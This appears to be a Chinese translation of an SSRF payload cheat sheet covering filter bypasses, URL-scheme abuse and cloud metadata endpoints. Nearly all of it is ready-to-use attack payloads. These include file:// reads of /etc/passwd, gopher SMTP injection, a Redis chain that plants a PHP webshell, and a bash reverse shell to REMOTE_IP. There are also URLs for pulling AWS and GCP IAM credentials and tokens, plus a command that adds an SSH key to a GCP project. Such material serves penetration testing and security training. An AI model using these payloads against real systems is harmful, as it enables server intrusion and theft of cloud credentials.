# 服务器端请求伪造

> 服务器端请求伪造（Server Side Request Forgery，SSRF）是一种漏洞，攻击者通过这种漏洞强迫服务器代表他们执行请求。

## 概述

* [工具](#工具)
* [使用本地主机的有效载荷](#使用本地主机的有效载荷)
* [绕过过滤器](#绕过过滤器)
  * [使用HTTPS绕过](#使用HTTPS绕过)
  * [使用[::]绕过本地主机](#使用[::]绕过本地主机)
  * [使用域名重定向绕过本地主机](#使用域名重定向绕过本地主机)
  * [使用CIDR绕过本地主机](#使用CIDR绕过本地主机)
  * [使用十进制IP地址位置绕过](#使用十进制IP地址位置绕过)
  * [使用八进制IP绕过](#使用八进制IP绕过)
  * [使用IPv6/IPv4地址嵌入绕过](#使用IPv6/IPv4地址嵌入绕过)
  * [使用格式错误的URL绕过](#使用格式错误的URL绕过)
  * [使用罕见地址绕过](#使用罕见地址绕过)
  * [使用URL编码绕过](#使用URL编码绕过)
  * [使用bash变量绕过](#使用bash变量绕过)
  * [使用技巧组合绕过](#使用技巧组合绕过)
  * [使用封闭字母数字绕过](#使用封闭字母数字绕过)
  * [绕过filter_var() PHP函数](#绕过filter_var()-PHP函数)
  * [针对弱解析器的绕过](#针对弱解析器的绕过)
  * [仅Java中使用jar协议绕过](#仅Java中使用jar协议绕过)
* [通过URL方案利用SSRF](#通过URL方案利用SSRF)
  * [file://](#file)
  * [http://](#http)
  * [dict://](#dict)
  * [sftp://](#sftp)
  * [tftp://](#tftp)
  * [ldap://](#ldap)
  * [gopher://](#gopher)
  * [netdoc://](#netdoc)
* [利用WSGI的SSRF](#利用WSGI的SSRF)
* [利用Redis的SSRF](#利用Redis的SSRF)
* [利用PDF文件的SSRF](#利用PDF文件的SSRF)
* [盲SSRF](#盲SSRF)
* [从SSRF到XSS](#从SSRF到XSS)
* [从XSS到SSRF](#从XSS到SSRF)
* [云实例的SSRF URL](#云实例的SSRF-URL)
  * [AWS存储桶的SSRF URL](#AWS存储桶的SSRF-URL)
  * [AWS ECS的SSRF URL](#AWS-ECS的SSRF-URL)
  * [AWS弹性Beanstalk的SSRF URL](#AWS弹性Beanstalk的SSRF-URL)
  * [AWS Lambda的SSRF URL](#AWS-Lambda的SSRF-URL)
  * [谷歌云的SSRF URL](#谷歌云的SSRF-URL)
  * [Digital Ocean的SSRF URL](#Digital-Ocean的SSRF-URL)
  * [Packetcloud的SSRF URL](#Packetcloud的SSRF-URL)
  * [Azure的SSRF URL](#Azure的SSRF-URL)
  * [OpenStack/RackSpace的SSRF URL](#OpenStack/RackSpace的SSRF-URL)
  * [HP Helion的SSRF URL](#HP-Helion的SSRF-URL)
  * [Oracle云的SSRF URL](#Oracle云的SSRF-URL)
  * [Kubernetes ETCD的SSRF URL](#Kubernetes-ETCD的SSRF-URL)
  * [阿里巴巴的SSRF URL](#阿里巴巴的SSRF-URL)
  * [Docker的SSRF URL](#Docker的SSRF-URL)
  * [Rancher的SSRF URL](#Rancher的SSRF-URL)

## 工具

- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动SSRF模糊器和利用工具
- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 生成用于利用SSRF和在各种服务器上获得RCE的gopher链接
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - 基于Python的扫描器，用于查找潜在的SSRF参数
- [teknogeek/SSRF Sheriff](https://github.com/teknogeek/ssrf-sheriff) - 用Go编写的简单SSRF测试警长

* [assetnote/surf](https://github.com/assetnote/surf) - 返回一个可行的SSRF候选列表
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - 一个快速、线程安全、直接且零内存分配的工具，用于在Go中快速生成替代IP(v4)地址表示形式。

## 使用本地主机的有效载荷

* 使用`localhost`

  ```powershell
  http://localhost:80
  http://localhost:443
  http://localhost:22
  ```

* 使用`127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:443
  http://127.0.0.1:22
  ```

* 使用`0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:443
  http://0.0.0.0:22
  ```

## 绕过过滤器

### 使用HTTPS绕过

```powershell
https://127.0.0.1/
https://localhost/
```

### 使用[::]绕过本地主机

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```powershell
http://[0000::1]:80/
http://[0000::1]:25/ SMTP
http://[0000::1]:22/ SSH
http://[0000::1]:3128/ Squid
```

### 通过域名重定向绕过本地主机

| 域名                         | 重定向到    |
| ---------------------------- | ----------- |
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

nip.io服务在这方面很棒，它可以将任何IP地址转换为DNS。

```powershell
NIP.IO将<anything>.<IP Address>.nip.io映射到相应的<IP Address>，即使是127.0.0.1.nip.io也映射到127.0.0.1。
```

### 使用CIDR绕过本地主机

来自127.0.0.0/8的IP地址

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### 使用十进制IP地址位置绕过

```powershell
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254
```

转换脚本

```
def ip_to_decimal(ip):
    # 分割IP地址的每个部分
    octets = ip.split('.')
    
    # 将每个部分转换为8位二进制数
    binary_str = ''.join(f"{int(octet):08b}" for octet in octets)
    
    # 将32位二进制数转换为十进制数
    decimal_number = int(binary_str, 2)
    
    return decimal_number

# 测试函数
ip_address = "192.168.0.1"
decimal_number = ip_to_decimal(ip_address)
print(decimal_number)  # 输出: 3232235521

```



### 使用八进制IP地址绕过

关于如何处理IPv4的八进制格式的实现各不相同。

```sh
http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1
...
```



脚本

```
def ip_to_octal(ip):
    # 分割IP地址的每个部分
    octets = ip.split('.')
    
    # 将每个部分转换为8位二进制数，再转换为八进制
    octal_parts = [
        oct(int(octet))[2:]  # int(octet)转换为十进制整数，oct()转换为八进制字符串并去掉'0o'
        for octet in octets
    ]
    
    # 使用点分隔各个八进制数
    octal_ip = '0o' + '.'.join(octal_parts)
    return octal_ip

# 测试函数
ip_address = "127.0.0.1"
octal_ip = ip_to_octal(ip_address)
print(octal_ip)  # 输出: 0o177.0.0.1

```





参考：

- [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
- [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)

### 使用IPv6/IPv4地址嵌入绕过

[IPv6/IPv4地址嵌入](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

```powershell
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
```

### 使用格式错误的URL绕过

```powershell
localhost:+11211aaa
localhost:00011211aaaa
```

### 使用罕见地址绕过

您可以通过省略零来简化IP地址

```powershell
http://0/
http://127.1
http://127.0.1
```

### 使用URL编码绕过

[对特定URL进行单次或双重编码以绕过黑名单](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

```powershell
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

### 使用bash变量绕过

（仅curl）

```powershell
curl -v "http://evil$google.com"
$google = ""
```

### 使用技巧组合绕过

```powershell
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

### 使用封闭字母数字绕过

[@EdOverflow](https://twitter.com/EdOverflow)

```powershell
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

列表：
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### 使用Unicode绕过

在某些语言中（如.NET、Python 3），正则表达式默认支持Unicode。
`\d` 包括 `0123456789`，但也包括 `๐๑๒๓๔๕๖๗๘๙`。

### 绕过 filter_var() php函数

```powershell
0://evil.com:80;http://google.com:80/ 
```



根据您提供的文档内容，以下是相关内容的整理：

### 针对弱解析器的绕过策略

作者：Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![弱解析器图示](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)

### 使用重定向绕过

[通过开放重定向绕过SSRF过滤器](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)

```powershell
1. 在白名单主机上创建一个页面，该页面将请求重定向到SSRF目标URL（例如192.168.0.1）
2. 启动指向vulnerable.com/index.php?url=http://YOUR_SERVER_IP的SSRF
vulnerable.com将获取YOUR_SERVER_IP，然后重定向到192.168.0.1
3. 您可以使用响应代码[307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307)和[308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308)来在重定向后保留HTTP方法和主体。
```

### 使用type=url绕过

```powershell
将"type=file"更改为"type=url"
在文本字段中粘贴URL并按回车
利用此漏洞，用户可以从任何图像URL上传图像=触发SSRF
```

### 使用DNS重绑定（TOCTOU）绕过

```powershell
创建一个在两个IP之间切换的域名。http://1u.ms/为此目的而存在。
例如，要在1.2.3.4和169.254-169.254之间轮换，请使用以下域名：
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

### 使用jar协议（仅限Java）绕过

盲SSRF

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## 通过URL Scheme利用SSRF

### 文件

允许攻击者获取服务器上文件的内容

```powershell
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

### HTTP

允许攻击者从网络获取任何内容，也可以用来扫描端口。

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

![SSRF流](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)

以下URL方案可用于探测网络

### DICT

DICT URL方案用于引用使用DICT协议可用的定义或单词列表：

```powershell
dict://<用户>;<认证>@<主机>:<端口>/d:<单词>:<数据库>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP

一种用于通过安全外壳进行安全文件传输的网络协议

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

简单文件传输协议，通过UDP工作

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

轻量级目录访问协议。它是一个应用协议，通过IP网络管理和访问分布式目录信息服务。

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Gopher

```powershell
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

会发起如下请求
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT

#### Gopher HTTP

```powershell
gopher://<代理服务器>:8080/_GET http://<攻击者:80>/x HTTP/1.1%0A%0A
gopher://<代理服务器>:8080/_POST%20http://<攻击者>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

#### Gopher SMTP - 反向连接到1337

```php
evil.com/redirect.php的内容:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

现在查询它。
https://example.com/?q=http://evil.com/redirect.php.
```

#### Gopher SMTP - 发送邮件

```php
evil.com/redirect.php的内容:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

### Netdoc

当您的有效载荷与" "和"\r"字符斗争时，Java的包装器。

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

## 利用WSGI进行SSRF攻击

使用Gopher协议进行利用，完整利用脚本可在 https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py 获取。

```powershell
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```

| 头部                  |           |             |
| --------------------- | --------- | ----------- |
| modifier1             | (1 字节)  | 0 (%00)     |
| datasize              | (2 字节)  | 26 (%1A%00) |
| modifier2             | (1 字节)  | 0 (%00)     |
| 变量 (UWSGI_FILE)     |           |             |
| --------------------- | --------- | ----        |
| key length            | (2 字节)  | 10          |
| key data              | (m 字节)  |             |
| value length          | (2 字节)  | 12          |
| value data            | (n 字节)  |             |

## 利用Redis进行SSRF攻击

> Redis是一个将所有内容存储在RAM中的数据库系统

```powershell
# 获取一个webshell
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE

# 获取一个PHP反向shell
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
```

## 利用PDF文件进行SSRF攻击

![https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png)

示例使用 [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)

```powershell
<link rel=attachment href="file:///root/secret.txt">
```

示例使用phantomJS 

```js
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```



文档：## 盲SSRF

> 在利用服务器端请求伪造时，我们经常会发现自己处于无法读取响应的位置。

使用SSRF链来获得带外输出。

来自 https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains

**可能通过HTTP(s)**

- [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
- [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
- [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
- [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
- [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
- [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
- [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
- [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
- [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
- [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
- [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
- [其他Atlassian产品](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
- [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
- [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
- [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
- [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
- [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
- [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**可能通过Gopher**

- [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
- [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
- [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## SSRF到XSS

作者：@D0rkerDevil & @alyssa.o.herrera https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158

```bash
http://brutelogic.com.br/poc.svg -> 简单警报
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> 简单SSRF

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
```

## 通过XSS实现SSRF

### 使用iframe

文件内容将作为图像或文本整合到PDF中。

```html
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```

### 使用附件

使用HTML的PDF附件示例

1. 使用`<link rel=attachment href="URL">`作为个人简介文本
2. 使用'下载数据'功能获取PDF
3. 使用`pdfdetach -saveall filename.pdf`提取嵌入式资源
4. `cat attachment.bin`

## 针对云实例的SSRF URL

### AWS的SSRF URL

AWS实例元数据服务是一项在Amazon EC2实例中可用的服务，允许这些实例访问有关自身的元数据。- [文档](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

* IPv4端点（旧）：`http://169.254.169.254/latest/meta-data/`

* IPv4端点（新）需要`X-aws-ec2-metadata-token`头

  ```powershell
  $TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6端点：`http://[fd00:ec2::254]/latest/meta-data/`

如果存在WAF，您可能需要尝试不同的方法连接到API。

* 指向AWS API IP的DNS记录

  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP 重定向
  ```powershell
  静态:http://nicob.net/redir6a
  动态:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* 编码IP以绕过WAF
  ```powershell
  http://425.510.425.510 使用溢出点的十进制点分表示法
  http://2852039166 无点十进制表示法
  http://7147006462 带溢出的无点十进制表示法
  http://0xA9.0xFE.0xA9.0xFE 点分十六进制表示法
  http://0xA9FEA9FE 无点十六进制表示法
  http://0x41414141A9FEA9FE 带溢出的无点十六进制表示法
  http://0251.0376.0251.0376 点分八进制表示法
  http://0251.00376.000251.0000376 带填充的点分八进制表示法
  http://0251.254.169.254 混合编码（点分八进制+点分十进制）
  http://[::ffff:a9fe:a9fe] 压缩的IPv6格式
  http://[0:0:0:0:0:ffff:a9fe:a9fe] 扩展的IPv6格式
  http://[0:0:0:0:0:ffff:169.254.169.254] IPv6/IPv4格式
  http://[fd00:ec2::254] IPv6格式
  ```

这些URL返回与实例关联的IAM角色列表。然后，您可以将角色名称附加到此URL以检索该角色的安全凭据。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]

# 示例
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
```

此URL用于访问在启动实例时指定的用户数据。用户数据通常用于将启动脚本或其他配置信息传递到实例中。

```powershell
http://169.254.169.254/latest/user-data
```

查询其他URL以访问有关实例的各种元数据，如主机名、公共IPv4地址和其他属性。

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

例如：Jira SSRF导致AWS信息泄露 - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`

例如2：Flaws挑战 - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

### AWS ECS的SSRF URL

如果您在ECS实例上拥有带文件系统访问权限的SSRF，请尝试提取`/proc/self/environ`以获取UUID。

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

通过这种方式，您将提取附加角色的IAM密钥

### AWS Elastic Beanstalk的SSRF URL

我们从API检索`accountId`和`region`。

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们从API检索`AccessKeyId`、`SecretAccessKey`和`Token`。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)

然后我们使用凭据与`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`。

### AWS Lambda的SSRF URL

AWS Lambda提供了一个HTTP API，供自定义运行时在Lambda执行环境内接收调用事件并发送响应数据。

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
```

文档：<https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next>

### Google Cloud的SSRF URL

警告：Google将于1月15日停止支持**v1元数据服务**的使用。

需要"Metadata-Flavor: Google"或"X-Google-Metadata-Request: True"头

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google允许递归拉取

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta版目前不需要头（感谢Mathias Karlsson @avlidienbrunn）

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

可以使用以下技术设置所需的头

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

需要提取的文件：

- SSH公钥：`http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- 获取访问令牌：`http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
- Kubernetes密钥：`http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

#### 添加SSH密钥

提取令牌

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

检查令牌的范围

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

现在推送SSH密钥。

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Digital Ocean的SSRF URL

文档可在`https://developers.digitalocean.com/documentation/metadata/`获取

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

所有请求一体化：
curl http://169.254.169.254/metadata/v1.json | jq
```



### SSRF URL for Packetcloud

文档可在 `https://metadata.packet.net/userdata` 获取

### SSRF URL for Azure

有限的，可能还有更多？`https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

2017年4月更新，Azure支持更多；需要"Metadata: true"头 `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### SSRF URL for OpenStack/RackSpace

（是否需要头？未知）

```powershell
http://169.254.169.254/openstack
```

### SSRF URL for HP Helion

（是否需要头？未知）

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

### SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

### SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```



### Kubernetes ETCD的SSRF URL

可能包含API密钥以及内部IP和端口

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### Docker的SSRF URL

```powershell
http://127.0.0.1:2375/v1.24/containers/json

简单示例
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

更多信息：

- 守护程序套接字选项：[https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option)
- Docker引擎API：[https://docs.docker.com/engine/api/latest/](https://docs.docker.com/engine/api/latest/)

### Rancher的SSRF URL

```powershell
curl http://rancher-metadata/<version>/<path>
```

更多信息：[https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/](https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/)

## 实验靶场

- 基础SSRF攻击本地服务器：[Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- 基础SSRF攻击另一个后端系统：[Basic SSRRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
- 使用黑名单输入过滤器的SSRF：[SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
